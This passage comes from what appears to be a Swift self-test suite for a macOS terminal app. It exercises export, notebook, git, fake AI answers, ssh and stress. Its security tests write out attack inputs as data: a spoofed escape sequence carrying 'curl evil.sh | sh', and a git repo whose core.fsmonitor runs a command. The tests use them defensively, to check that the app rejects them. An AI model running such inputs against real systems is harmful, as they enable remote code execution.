            return !out.isEmpty && (out.contains("clean-ok") || out.contains("anser-ok-42")) && !b.command.contains("anser-ok") && !b.command.contains("clean-ok")
        }
        check("saved outputs match their commands", mismatched.isEmpty && s.blocks.contains { $0.command.hasPrefix("echo clean-ok") && $0.output?.contains("clean-ok") == true },
              mismatched.map { String($0.command.prefix(20)) }.joined(separator: ", "))
        let md = wc.markdown(for: pane)
        check("export tab as Markdown", md.contains("## ✓ `echo hello team") && md.contains("hello team") && md.contains("## ✗"),
              "\(md.count) chars")
        try? md.write(toFile: shotDir + "/export.md", atomically: true, encoding: .utf8)

        // Export one command's output in every format.
        if let hello = s.blocks.lastIndex(where: { $0.command.hasPrefix("echo hello team") }) {
            let entries = wc.exportEntries(for: pane, block: hello)
            var written: [String] = []
            for f in SessionExport.Format.allCases {
                let url = URL(fileURLWithPath: shotDir + "/export-one.\(f.fileExtension)")
                do { try TerminalWindowController.write(f, title: entries[0].command, entries: entries, to: url); written.append(f.fileExtension) } catch {}
            }
            let pdf = (try? Data(contentsOf: URL(fileURLWithPath: shotDir + "/export-one.pdf"))) ?? Data()
            let json = (try? Data(contentsOf: URL(fileURLWithPath: shotDir + "/export-one.json")))
                .flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
            let out = ((json?["commands"] as? [[String: Any]])?.first?["output"] as? String) ?? ""
            check("export a command's output as JSON, PDF, HTML, Markdown, text",
                  written.count == SessionExport.Format.allCases.count && pdf.starts(with: Data("%PDF".utf8)) && out.contains("hello team"),
                  "\(written.joined(separator: ",")) · pdf \(pdf.count) bytes")
        } else {
            check("export a command's output as JSON, PDF, HTML, Markdown, text", false, "no block")
        }

        // ---- Command Notebook ----
        NotebookWindow.fileURL = URL(fileURLWithPath: tmp + "/notebook.json")
        try? FileManager.default.removeItem(at: NotebookWindow.fileURL)   // start empty on every run
        pane.editor.setCommand("echo from-notebook {{name}}")
        pane.saveToNotebook()
        let nbw = NotebookWindow.shared
        ok = await wait(2) { nbw.isVisible && nbw.titles.contains("echo from-notebook {{name}}") }
        check("save the editor's command to the notebook", ok, nbw.titles.joined(separator: ", "))
        nbw.newGroup()
        nbw.saveNow()
        let savedNB = (try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()
        check("notebook is saved with groups", savedNB.groups.count == 2 && savedNB.entryCount == 1,
              savedNB.groups.map { $0.name }.joined(separator: ", "))
        if let v = nbw.contentView { snapView(v, "notebook") }
        pane.editor.clear()
        nbw.selectFirstEntry()
        nbw.pasteSelected()
        ok = await wait(2) { pane.editor.string.hasPrefix("echo from-notebook") }
        check("paste a saved command into the terminal", ok, pane.editor.string)
        pane.editor.clear()
        nbw.close()
        // The right-hand panel, from the book button at the right end of the tab bar.
        wc.tabBar.layoutSubtreeIfNeeded()
        let lastTab = wc.tabBar.frameForTab(wc.tabs.count - 1, count: wc.tabs.count)
        check("notebook button sits at the right of the tab bar",
              wc.tabBar.notebookButtonFrame.minX > lastTab.maxX && wc.tabBar.notebookButtonFrame.maxX <= wc.tabBar.bounds.width,
              "\(wc.tabBar.notebookButtonFrame) after \(lastTab)")
        let panelBefore = wc.notebookPanelVisible
        wc.tabBar.clickNotebookButton()
        await sleep(0.35)
        // The terminal makes room on the right (the panel's own frame can lag behind its slide-in animation).
        let windowWidth = wc.window?.contentView?.bounds.width ?? 0
        ok = await wait(2) {
            wc.window?.contentView?.layoutSubtreeIfNeeded()
            return pane.convert(pane.bounds, to: nil).maxX <= windowWidth - NotebookPanelView.defaultWidth + 1
        }
        check("notebook panel opens on the right with the saved commands",
              ok && !panelBefore && wc.notebookPanelVisible && wc.notebookPanel.rowTitles.contains("echo from-notebook {{name}}"),
              "terminal ends at \(Int(pane.convert(pane.bounds, to: nil).maxX)) of \(Int(windowWidth)) · \(wc.notebookPanel.rowTitles)")
        if let v = wc.window?.contentView { snapView(v, "notebook-panel") }
        pane.editor.clear()
        wc.notebookPanel.clickRow(0)
        ok = await wait(2) { pane.editor.string.hasPrefix("echo from-notebook") }
        check("clicking a panel row puts it in the editor", ok, pane.editor.string)
        pane.editor.clear()
        wc.tabBar.clickNotebookButton()
        await sleep(0.35)
        check("notebook button hides the panel again", !wc.notebookPanelVisible)
        wc.refreshSidebar()

        // ---- Git menu pickers ----
        _ = await ScriptRunner.shared.run("git -c user.email=t@t -c user.name=t commit -q --allow-empty -m 'second commit'", cwd: tmp, env: s.env)
        wc.showGitHistory(for: pane)
        ok = await wait(4) { openPicker()?.itemTitles.contains("second commit") == true }
        if let p = openPicker() {
            let previewed = await wait(4) { p.previewString.contains("Author:") }
            ok = ok && previewed
            snapView(p.contentView!, "picker-history")
            p.close()
        }
        check("commit history lists commits with a preview", ok)
        wc.showStashes(for: pane)
        ok = await wait(4) { openPicker()?.itemTitles.contains("Stash my changes") == true }
        openPicker()?.close()
        check("stashes picker offers to stash changes", ok)
        let menuTitles = NSApp.mainMenu?.items.compactMap { $0.submenu?.title } ?? []
        let tools = NSApp.mainMenu?.items.first { $0.submenu?.title == "Tools" }?.submenu?.items.map(\.title) ?? []
        check("Git and Tools menus", menuTitles.contains("Git") && tools.contains("Command Notebook") && tools.contains("Workflows…"),
              menuTitles.joined(separator: " "))

        // ---- AI help (fake Claude responses; no network, no key) ----
        let sent = SentBodies()
        Services.shared.aiForcedOn = true
        Services.shared.ai = AIHelp(apiKey: { "test-key" }, transport: { req in
            let body = String(data: req.httpBody ?? Data(), encoding: .utf8) ?? ""
            sent.add(body)
            if body.contains("refuse-me") {
                return (200, Data(#"{"stop_reason":"refusal","stop_details":{"category":"cyber"},"content":[]}"#.utf8))
            }
            let text = body.contains("failed with exit code")
                ? "The branch has no upstream yet, so `git push` doesn't know where to push.\n```sh\ngit push -u origin HEAD\n```"
                : "Finds big files changed this week:\n```sh\nfind . -size +100M -mtime -7\n```"
            return (200, Data(try! JSONSerialization.data(withJSONObject: ["stop_reason": "end_turn", "content": [["type": "text", "text": text]]])))
        })
        pane.run("false && echo 'password=hunter2' # anser-selftest-ai")
        _ = await wait(10) { s.blocks.last?.command.contains("anser-selftest-ai") == true && s.atPrompt }
        await sleep(0.3)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "explain-chip")
        pane.explainLastError()
        func aiPanel() -> AIPanel? { NSApp.windows.compactMap { $0 as? AIPanel }.first { $0.isVisible } }
        ok = await wait(5) { aiPanel()?.answer != nil }
        check("Explain shows Claude's answer and a command", ok && aiPanel()?.answer?.commands == ["git push -u origin HEAD"])
        check("request uses the default model and fallbacks", sent.all.last?.contains("claude-opus-5-5") == true && sent.all.last?.contains("\"fallbacks\":\"default\"") == true)
        if let p = aiPanel(), let v = p.contentView { snapView(v, "ai-explain") }
        aiPanel()?.insert("git push -u origin HEAD")
        check("Insert puts the command in the editor (not run)", pane.editor.string == "git push -u origin HEAD" && s.atPrompt)
        pane.editor.clear()
        pane.askClaude()
        ok = await wait(3) { aiPanel() != nil }
        if let p = aiPanel() {
            p.show(try! await Services.shared.ai.generateCommand("big files this week", context: .init(shell: "zsh", os: "macOS", cwdName: "x", gitBranch: nil)))
            check("Ask Claude generates a command", p.answer?.commands.first == "find . -size +100M -mtime -7")
            p.close()
        }
        do {
            _ = try await Services.shared.ai.generateCommand("refuse-me", context: .init(shell: "zsh", os: "macOS", cwdName: "x", gitBranch: nil))
            check("refusals are reported, not shown as answers", false)
        } catch {
            check("refusals are reported, not shown as answers", (error as? AIHelp.AIError) == .refused("cyber"))
        }

        // GitHub Copilot as the provider (fake CLI run; no network): the explain flow and labels switch over.
        let copilotArgs = ArgsCapture()
        Services.shared.ai = AIHelp(copilotPath: { "/fake/copilot" }, runner: { argv, _ in
            copilotArgs.set(argv)
            return (0, #"{"type":"assistant.message","data":{"model":"gpt-test","content":"No upstream yet.\n```sh\ngit push -u origin HEAD\n```"}}"#, false)
        })
        pane.explainLastError()
        ok = await wait(5) { aiPanel()?.answer != nil }
        check("Copilot answers through the same panel, with tools off",
              ok && aiPanel()?.answer?.commands == ["git push -u origin HEAD"] && aiPanel()?.answer?.model == "GitHub Copilot · gpt-test"
                && copilotArgs.get().last == "--available-tools" && !copilotArgs.get().contains { $0.contains("hunter2") },
              aiPanel()?.answer?.model ?? "no answer")
        check("labels name the chosen AI", Services.shared.aiName == "GitHub Copilot")
        aiPanel()?.close()
        Services.shared.aiOverride = nil
        Services.shared.aiForcedOn = false

        // ---- ssh: run the exact bootstrap ssh would send, in a nested local shell ----
        let before = s.blocks.count
        pane.run("zsh -c \"$(_anser_ssh_command)\" # anser-selftest-ssh")
        ok = await wait(40) { s.isRemote && s.atPrompt }
        check("remote hooks connect (editor works over ssh)", ok && pane.editorUsable, s.displayCwd)
        await sleep(0.3)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "remote")
        pane.run("echo remote-ok # anser-selftest")
        ok = await wait(15) { s.blocks.last?.command == "echo remote-ok # anser-selftest" && s.atPrompt }
        await sleep(0.8)
        check("remote command recorded with its output", ok && s.blocks.last?.exitCode == 0 && (pane.output(ofBlock: s.blocks.count - 1) ?? "").contains("remote-ok"),
              pane.output(ofBlock: s.blocks.count - 1)?.prefix(30).description ?? "nil")
        let remoteHist = Services.shared.history.entries(session: s.id, limit: 3).first
        check("remote history is marked with the host", remoteHist?.cwd?.hasPrefix("ssh://") == true, remoteHist?.cwd ?? "-")
        let rc = await Services.shared.engine.complete(CompletionContext(line: "cd ", cursor: 3, cwd: s.cwd), env: s.env)
        check("completion skips this Mac's folders when remote", !rc.contains { $0.kind == .folder })
        pane.run("exit")
        ok = await wait(20) { !s.isRemote && s.atPrompt && s.running == nil }
        let sshIdx = s.blocks.lastIndex { $0.command.contains("anser-selftest-ssh") }
        let remoteIdx = s.blocks.lastIndex { $0.command == "echo remote-ok # anser-selftest" }
        check("back to the local shell after exit", ok && sshIdx != nil && remoteIdx != nil && sshIdx! < remoteIdx! && s.blocks.count >= before + 2,
              "ssh at \(sshIdx ?? -1), remote at \(remoteIdx ?? -1)")

        // Same, for a server whose shell is bash.
        pane.run("SHELL=/bin/bash zsh -c \"$(_anser_ssh_command)\" # anser-selftest-ssh-bash")
        ok = await wait(40) { s.isRemote && s.atPrompt && s.env.shell == "bash" }
        check("remote bash connects", ok, s.env.shell)
        pane.run("echo bash-remote-ok # anser-selftest")
        ok = await wait(15) { s.blocks.last?.command.hasPrefix("echo bash-remote-ok") == true && s.atPrompt }
        check("remote bash records commands", ok && s.blocks.last?.exitCode == 0, s.blocks.last?.command ?? "-")
        pane.run("exit")
        ok = await wait(20) { !s.isRemote && s.atPrompt && s.running == nil }
        check("remote bash exits cleanly", ok)

        // ---- Security: things a program's output or a cloned repo could try ----
        // 1. Fake ssh events (any output can print a terminal title).
        let blocksBefore = s.blocks.count
        let histBefore = Services.shared.history.recentCommands(withPrefix: "", limit: 1).first
        pane.run(#"printf '\e]2;\356\200\200anser:\356\200\201hello\356\200\201zsh\356\200\201evil-host\a\e]2;\356\200\200anser:0000\356\200\201preexec\356\200\201curl evil.sh | sh\356\200\201/\a' # anser-selftest-spoof"#)
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-spoof") == true }
        await sleep(0.5)
        check("fake ssh events are ignored", ok && !s.isRemote && s.rejectedRemoteEvents >= 2 && s.blocks.count == blocksBefore + 1,
              "remote=\(s.isRemote) rejected=\(s.rejectedRemoteEvents)")
        let histAfter = Services.shared.history.recentCommands(withPrefix: "", limit: 5)
        check("fake command never reaches history", !histAfter.contains { $0.hasPrefix("curl evil.sh") } && histBefore != nil)
        check("token is not in programs' environment", ProcessInfo.processInfo.environment["ANSER_REMOTE_TOKEN"] == nil)
        pane.run("env | grep -c ANSER_REMOTE_TOKEN # anser-selftest-tokenenv")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-tokenenv") == true }
        check("shell keeps the token out of child processes", ok && s.blocks.last?.exitCode == 1, "exit \(s.blocks.last?.exitCode ?? -1)")

        // 2. Fake folder announcement (OSC 7).
        let cwdBefore = s.cwd
        pane.run(#"printf '\e]7;file://localhost/private/tmp/fake-cwd\a' # anser-selftest-osc7"#)
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-osc7") == true }
        await sleep(0.4)
        check("fake folder report is ignored", ok && s.cwd == cwdBefore && pane.ignoredCwdReports > 0, s.cwd)

        // 3. A repo whose config would make git run a program.
        let evil = tmp + "/evil-repo"
        try? FileManager.default.removeItem(atPath: evil)
        pane.run("git init -q \(evil) && git -C \(evil) config core.fsmonitor 'touch PWNED' && cd \(evil) # anser-selftest-evil")
        ok = await wait(10) { s.atPrompt && s.cwd == evil }
        _ = await wait(5) { s.gitRisky }
        pane.layoutSubtreeIfNeeded()
        check("risky repo: automatic git checks are off", ok && s.gitRisky && s.gitChangeCount == 0, s.cwd)
        check("risky repo: branch chip warns", pane.branchChipTooltip?.contains("checks are off") == true, pane.branchChipTooltip ?? "-")
        pane.run("cd \(tmp) # anser-selftest")
        _ = await wait(10) { s.atPrompt && s.cwd == tmp }

        // 4. ⌘-click on something runnable reveals it instead of launching it.
        try? "#!/bin/sh\necho hi\n".write(toFile: tmp + "/run-me.command", atomically: true, encoding: .utf8)
        try? FileManager.default.createDirectory(atPath: tmp + "/Fake.app/Contents", withIntermediateDirectories: true)
        pane.run("echo run-me.command Fake.app # anser-selftest-links")
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-selftest-links") == true }
        await sleep(0.3)
        _ = pane.openLink("run-me.command")
        check("⌘-click a .command reveals it, never runs it", pane.lastOpenAction == "reveal", pane.lastOpenAction)
        _ = pane.openLink("Fake.app")
        check("⌘-click an app bundle reveals it", pane.lastOpenAction == "reveal", pane.lastOpenAction)

        // 5. Clipboard writes from programs need consent.
        check("programs must ask to write the clipboard", GhosttyRuntime.shared.configText.contains("clipboard-write = ask"))

        // ---- Stress ----
        func hangs() -> Int { Diagnostics.shared.recentBreadcrumbs.filter { $0.contains("HANG:") }.count }
        let hangsBefore = hangs()

        // Typing speed: 60 keystrokes through the full editor path.
        var t0 = Date()
        type(pane, "git commit -m 'stress test of typing speed in the editor' --amend")
        let perKey = Date().timeIntervalSince(t0) * 1000 / 60
        check("typing stays fast", perKey < 25, String(format: "%.1f ms per key (debug build)", perKey))
        pane.editor.clear()

        // Huge output (memory is sampled while it runs).
        let memProbe = MemoryProbe()
        t0 = Date()
        pane.run("seq 1 3000000 # anser-selftest")
        ok = await wait(90) { s.blocks.last?.command.hasPrefix("seq 1 3000000") == true && s.atPrompt }
        await sleep(1)
        memoryLog.append("3 million lines: " + memProbe.finish())
        let secs = Date().timeIntervalSince(t0)
        check("3 million lines of output", ok && secs < 30, String(format: "%.1fs", secs))
        await sleep(0.5)
        // Give the tab's last 20 commands 3 MB of output each, as a run of big builds would.
        let bigLog = String(repeating: "build log line with some text\n", count: 100_000)
        for i in s.blocks.indices.suffix(20) { s.setOutput(bigLog, forBlockAt: i) }
        check("a tab keeps at most 12 MB of output in memory (not 60 MB)", s.outputBytes <= OutputBudget.standard.total
              && (s.blocks.last?.output?.utf8.count ?? 0) <= OutputBudget.standard.newest && s.outputBytes > 1 << 20,
              MemoryUse.megabytes(UInt64(s.outputBytes)))
        MemoryManager.shared.trim(critical: false)
        check("when macOS is short of memory, Anser keeps much less", s.outputBytes <= OutputBudget.tight.total, MemoryUse.megabytes(UInt64(s.outputBytes)))
        s.outputBudget = .standard
        let bigCopy = String(repeating: "x", count: 2 << 20)
        NSPasteboard.general.clearContents()
        NSPasteboard.general.setString(bigCopy, forType: .string)
        await sleep(1)
        check("huge copies aren't kept in clipboard history", !Services.shared.clipboard.items.contains { $0.text.utf8.count > ClipboardHistory.maxItemBytes })
        NSPasteboard.general.clearContents()
        check("scrollback per tab is set", GhosttyRuntime.shared.configText.contains("scrollback-limit = \(Services.shared.config.scrollbackMB * 1_000_000)"))

        // Resizing while output streams.
        let memProbe2 = MemoryProbe()
        let frame0 = wc.window!.frame
        pane.run("seq 1 1500000 # anser-selftest")
        for i in 0..<12 {
            wc.window!.setFrame(frame0.insetBy(dx: CGFloat(i % 3) * 40, dy: CGFloat(i % 2) * 30), display: true)
            await sleep(0.08)
        }
        wc.window!.setFrame(frame0, display: true)
        ok = await wait(60) { s.blocks.last?.command.hasPrefix("seq 1 1500000") == true && s.atPrompt }
        check("resizing during output", ok)
        await sleep(1)
        memoryLog.append("resizing during output: " + memProbe2.finish())

        // Big paste into the editor.
        let big = (1...5000).map { "echo line \($0) | grep -v nothing" }.joined(separator: "\n")
        t0 = Date()
        pane.editor.setCommand(big)
        pane.layoutSubtreeIfNeeded()
        let pasteMs = Date().timeIntervalSince(t0) * 1000
        check("5,000-line paste into the editor", pane.editor.logicalLineCount == 5000 && pasteMs < 3000, String(format: "%.0f ms", pasteMs))
        pane.editor.clear()

        // A full-screen program opens and closes cleanly.
        pane.run("vim -u NONE -N -c 'sleep 400m' -c q # anser-selftest")
        let sawFullscreen = await wait(5) { pane.isFullscreenProgram }
        ok = await wait(15) { s.atPrompt && !pane.isFullscreenProgram }
        check("vim opens full screen and returns", sawFullscreen && ok && pane.editorUsable)

        check("no UI hangs during stress", hangs() == hangsBefore, "\(hangs() - hangsBefore) hangs logged")

        // Live appearance change (only against a throwaway config folder).
        let cfgDir = AnserConfig.directory.path
        if cfgDir.hasPrefix(NSTemporaryDirectory()) || cfgDir.hasPrefix("/private/var/folders") || cfgDir.hasPrefix("/var/folders") {
            let json = #"{"appearance":{"theme":"Dracula","fontFamily":"Menlo"},"editor":{"fontSize":15}}"#
            try? json.write(to: AnserConfig.fileURL, atomically: true, encoding: .utf8)
            ok = await wait(5) { pane.editor.font?.familyName == "Menlo" }
            let bg = GhosttyRuntime.shared.theme.background.usingColorSpace(.sRGB)
            let isDracula = bg.map { abs($0.redComponent - 40.0 / 255) < 0.02 && abs($0.blueComponent - 54.0 / 255) < 0.02 } ?? false
            check("theme and font apply live", ok && isDracula && pane.editor.font?.pointSize == 15,
                  "font=\(pane.editor.font?.familyName ?? "-") bg=\(bg.map { "\(Int($0.redComponent * 255)),\(Int($0.greenComponent * 255)),\(Int($0.blueComponent * 255))" } ?? "-")")
            await sleep(0.3)
            snap(pane, "dracula")
            snapView(wc.tabBar, "tabbar-dracula")
            // Light theme pass.
            try? #"{"appearance":{"theme":"GitHub Light Default"}}"#.write(to: AnserConfig.fileURL, atomically: true, encoding: .utf8)
            ok = await wait(5) { !GhosttyRuntime.shared.theme.isDark }
            check("light theme applies", ok)
            await sleep(0.4)
            snap(pane, "light", full: true)
            snapView(wc.tabBar, "tabbar-light")
            wc.showBranchSwitcher(for: pane)
            _ = await wait(3) { NSApp.windows.contains { ($0 as? PickerPanel)?.isVisible == true } }
            await sleep(0.4)
            if let p = NSApp.windows.compactMap({ $0 as? PickerPanel }).first(where: { $0.isVisible }), let v = p.contentView { snapView(v, "picker-light"); p.close() }
        }

        // Errors stay visible: a missing command's message isn't hidden or covered by the input area.
        pane.run("anser-no-such-tool --flag # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("anser-no-such-tool") == true }
        await sleep(0.5)
        pane.layoutSubtreeIfNeeded()
        let errText = pane.surfaceView.viewportText() ?? ""
        let errLines = errText.split(separator: "\n", omittingEmptySubsequences: false).map(String.init)
        let errRow = errLines.lastIndex { $0.contains("command not found") }
        check("a missing command's error is printed", errRow != nil, errLines.suffix(4).joined(separator: " ⏎ "))
        if errRow != nil, let outputBottom = pane.outputBottomForTest {
            // Floating under the output: its top is below the last output line. At the bottom: the terminal ends above it.
            let clear = pane.followTop != nil ? pane.barTopForTest <= outputBottom + 0.5 : pane.surfaceView.frame.minY >= pane.barTopForTest - 0.5
            check("the input area doesn't cover the error", clear,
                  "bar top \(Int(pane.barTopForTest)) · output bottom \(Int(outputBottom)) · terminal bottom \(Int(pane.surfaceView.frame.minY))")
        }
        snap(pane, "error-visible", full: true)

        pane.run("ls /anser-no-such-dir # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.hasPrefix("ls /anser-no-such-dir") == true }
        await sleep(0.4)
        check("a program's error output shows too", (pane.surfaceView.viewportText() ?? "").contains("No such file or directory"))

        check("result marks never cover command text",
              !BlocksOverlayView.markFits(command: String(repeating: "x", count: 300), cellWidth: 8, markStart: 900)
                && BlocksOverlayView.markFits(command: "ls", cellWidth: 8, markStart: 900)
                && !BlocksOverlayView.markFits(command: "echo a\necho b", cellWidth: 8, markStart: 900))

        // ---- Output search ----
        pane.run("echo anser-needle-$((40+2))-found # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-needle") == true }
        ok = await wait(5) { !Services.shared.history.searchOutput("anser-needle-42-found").isEmpty }
        check("command output is saved and searchable", ok || !Services.shared.config.saveOutput,
              Services.shared.history.searchOutput("anser-needle-42").first?.line ?? "no hit")
        wc.showHistorySearch(for: pane, scope: .output)
        ok = await wait(3) { openPickerTitles().contains { $0.contains("anser-needle") } }
        check("History → Output scope finds it", ok || !Services.shared.config.saveOutput, openPickerTitles().prefix(3).joined(separator: " | "))
        closePickers()

        // ---- Profiles: badge, tab color, ask before running ----
        Services.shared.setProfilesForTest([Profile(folder: tmp, tabColor: "red", badge: "TESTPROD", confirm: ["*danger*"])])
        pane.updateProfile()
        check("folder profile shows a badge and colors the tab",
              pane.profile?.badge == "TESTPROD" && wc.tab(for: pane)?.profileColor == "red", "\(String(describing: pane.profile))")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "profile-badge")
        pane.submitFromEditor("echo danger-zone")
        ok = await wait(2) { pane.lastConfirmation != nil }
        if let alert = pane.lastConfirmation, let w = pane.window, let sheet = w.attachedSheet {
            check("profile asks before running matching commands", alert.messageText.contains("TESTPROD"), alert.messageText)
            w.endSheet(sheet, returnCode: .alertSecondButtonReturn)
            ok = await wait(2) { pane.editor.string == "echo danger-zone" }
            check("cancelling puts the command back in the editor", ok, pane.editor.string)
        } else {
            check("profile asks before running matching commands", false, "no confirmation shown")
        }
        pane.editor.clear()
        Services.shared.setProfilesForTest([])
        pane.updateProfile()
        check("profile clears when it no longer applies", pane.profile == nil && wc.tab(for: pane)?.profileColor == nil)

        // ---- Type in all panes ----
        wc.split(pane, vertical: true)
        let mate = wc.allPanes.first { $0 !== pane }!
        ok = await wait(30) { mate.session.integrated && mate.session.atPrompt }
        wc.toggleBroadcast(for: pane)
        check("broadcast turns on for the tab", wc.isBroadcasting(pane) && wc.isBroadcasting(mate))
        pane.layoutSubtreeIfNeeded()
        snap(pane, "broadcast")
        pane.submitFromEditor("echo anser-broadcast-ok # anser-selftest")
        ok = await wait(10) { mate.session.blocks.last?.command == "echo anser-broadcast-ok # anser-selftest" && mate.session.atPrompt && s.atPrompt }
        check("a command runs in every pane of the tab", ok, mate.session.blocks.last?.command ?? "none")
        wc.toggleBroadcast(for: pane)
        check("broadcast turns off", !wc.isBroadcasting(pane))
        Services.shared.tipsForcedOn = true
        Services.shared.resetTipsForTest()
        wc.close(mate)

        // ---- One-time tips ----
        for _ in 0..<6 { Services.shared.tip(in: pane) { $0.historyArrow() } }
        check("a tip appears at the moment it helps, in the status row", pane.lastTip?.contains("⌘R") == true && pane.hintText.contains("⌘R"),
              pane.hintText)
        pane.layoutSubtreeIfNeeded()
        snap(pane, "tip", full: true)
        let firstTip = pane.lastTip
        pane.hideTip()
        for _ in 0..<6 { Services.shared.tip(in: pane) { $0.historyArrow() } }
        check("each tip shows only once", pane.lastTip == firstTip)
        pane.hideTip()
        Services.shared.tipsForcedOn = false

        // ---- Notebook: workflows listed, values asked before running ----
        wc.toggleNotebookPanel()
        await sleep(0.3)
        check("notebook panel lists this project's workflows too", wc.notebookPanel.workflowCount >= 1 && wc.notebookPanel.rowTitles.contains { $0.hasPrefix("Greet and count") },
              wc.notebookPanel.rowTitles.joined(separator: ", "))
        wc.toggleNotebookPanel()
        wc.runNotebookEntry(Notebook.Entry(title: "Greet", command: "echo hi {{who}}"), in: pane)
        ok = await wait(2) { pane.window?.attachedSheet != nil }
        check("running a saved command with {{values}} asks for them first", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertSecondButtonReturn) }
        await sleep(0.2)

        // ---- Merge conflicts ----
        let repo = tmp + "/conflict-repo"
        try? FileManager.default.removeItem(atPath: repo)
        try? FileManager.default.createDirectory(atPath: repo, withIntermediateDirectories: true)
        let g = "git -c user.email=t@t -c user.name=t"
        _ = await ScriptRunner.shared.run("""
            git init -q -b main && echo base > f.txt && git add f.txt && \(g) commit -qm base && git switch -qc other && echo theirs > f.txt && \(g) commit -qam theirs \
            && git switch -q main && echo mine > f.txt && \(g) commit -qam mine && (\(g) merge -q other >/dev/null 2>&1 || true)
            """, cwd: repo, env: s.env, timeout: 10)
        pane.run("cd \(ShellLexer.escape(repo))")
        ok = await wait(10) { s.atPrompt && s.cwd.hasSuffix("conflict-repo") }
        ok = await wait(6) { pane.conflicts.count == 1 && pane.gitOperation == .merge }
        check("conflicts show in the status row during a merge", ok, "\(pane.conflicts.map(\.path)) \(String(describing: pane.gitOperation))")
        pane.layoutSubtreeIfNeeded()
        snap(pane, "conflicts")
        wc.showConflicts(for: pane)
        ok = await wait(4) { openPickerTitles().contains("f.txt") && openPickerTitles().contains { $0.hasPrefix("Abort the merge") } }
        check("conflict resolver lists files and abort", ok, openPickerTitles().joined(separator: " | "))
        if let p = openPicker() { _ = await wait(3) { p.previewString.contains("<<<<<<<") || p.previewString.contains("mine") }; snapView(p.contentView!, "picker-conflicts") }
        closePickers()
        pane.run("git merge --abort; cd \(ShellLexer.escape(tmp))")
        _ = await wait(10) { s.atPrompt && s.cwd.hasSuffix("anser-selftest") }

        // ---- Quick terminal ----
        QuickTerminal.shared.configure("ctrl+alt+shift+f12")
        check("quick terminal shortcut registers", QuickTerminal.shared.hotKey != nil, QuickTerminal.shared.problem ?? "")
        QuickTerminal.shared.show()
        ok = await wait(3) { QuickTerminal.shared.isShown }
        let qw = QuickTerminal.shared.controller?.window
        let top = qw.map { abs($0.frame.maxY - ($0.screen ?? NSScreen.main!).visibleFrame.maxY) < 2 } ?? false
        check("quick terminal drops down at the top of the screen", ok && top && qw?.level == .floating, "\(qw?.frame ?? .zero)")
        QuickTerminal.shared.hide()
        check("quick terminal hides again", !QuickTerminal.shared.isShown)
        QuickTerminal.shared.controller?.forceClose()
        QuickTerminal.shared.configure(nil)
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- Notification click returns to the tab; import from other terminals ----
        check("a finished-command notification can bring its tab back", AppDelegate.shared.reveal(sessionID: s.id))
        let themesDir = tmp + "/themes"
        try? FileManager.default.removeItem(atPath: themesDir)
        var found = Importers.Found(source: "Warp")
        found.themes = [Importers.Theme(name: "Warp - Test", text: "background = #101010\nforeground = #eeeeee\n")]
        found.entries = [Notebook.Entry(title: "Imported one", command: "echo imported-from-warp")]
        let summary = AppDelegate.performImport([found], applyLook: false, themesDir: themesDir, notebookURL: NotebookWindow.fileURL)
        let nbAfter = (try? Notebook.load(from: NotebookWindow.fileURL)) ?? Notebook()
        check("import writes themes and workflows", FileManager.default.fileExists(atPath: themesDir + "/Warp - Test")
              && nbAfter.groups.contains { $0.name == "From Warp" && $0.entries.contains { $0.command == "echo imported-from-warp" } },
              summary.replacingOccurrences(of: "\n", with: " "))

        // ---- Kept shells come back after a restart ----
        if SessionHost.shared.enabled {
            wc.addTab(cwd: tmp)
            let kp = wc.focusedPane!
            ok = await wait(30) { kp.session.integrated && kp.session.atPrompt }
            kp.run("export ANSER_KEPT=kept-42; echo before-restart-marker # anser-selftest")
            ok = await wait(10) { kp.session.atPrompt && kp.session.blocks.last?.command.contains("before-restart") == true }
            let keptID = kp.session.id
            check("new panes run through the session helper", ok && kp.session.persistent && SessionHost.shared.liveIDs().contains(keptID), keptID)
            // "Quit": save it and let go of the pane without ending the shell.
            SessionHost.shared.save(kp.session)
            kp.keepShellOnClose = true
            wc.closeTab(wc.tabs.count - 1)
            await sleep(1)
            check("the shell keeps running after its pane is gone", SessionHost.shared.liveIDs().contains(keptID))
            // "Reopen": restore the tab from its saved layout.
            SessionHost.shared.refreshLive()
            wc.addTab(restoring: .pane(cwd: tmp, session: keptID))
            let back = wc.focusedPane!
            check("it comes back as it was (ready at the prompt, same history)",
                  back.session.id == keptID && back.session.integrated && back.session.atPrompt
                    && back.session.blocks.last?.command.contains("before-restart") == true)
            ok = await wait(5) { (back.surfaceView.viewportText() ?? "").contains("before-restart-marker") }
            check("its earlier output is shown again", ok)
            back.run("echo value=$ANSER_KEPT # anser-selftest")
            ok = await wait(10) { (back.surfaceView.viewportText() ?? "").contains("value=kept-42") }
            check("it's the same shell (its variables are still set)", ok)
            snap(back, "reattached", full: true)
            wc.closeTab(wc.tabs.count - 1)
            ok = await wait(6) { !SessionHost.shared.liveIDs().contains(keptID) }
            check("closing a tab ends its shell", ok)
            wc.window?.makeKeyAndOrderFront(nil)
        } else {
            check("new panes run through the session helper", false, "helper missing or setting off")
        }

        // ---- Quick Look on hover, SSH hosts ----
        try? "hello from a previewed file\n".write(toFile: tmp + "/preview-me.txt", atomically: true, encoding: .utf8)
        let candidate = pane.previewCandidate("preview-me.txt:3")
        check("a printed file path (with :line) is found for Quick Look", candidate?.hasSuffix("preview-me.txt") == true, candidate ?? "none")
        check("missing files aren't previewed", pane.previewCandidate("no-such-file.txt") == nil)
        if let candidate {
            wc.window?.makeKeyAndOrderFront(nil)
            pane.showPreview(of: candidate, at: NSPoint(x: 80, y: 120))
            ok = await wait(2) { pane.previewShowing }
            check("hovering a path shows its preview", ok && pane.previewedPath == candidate)
            pane.mouseMovedOverOutput(at: NSPoint(x: 400, y: 400))
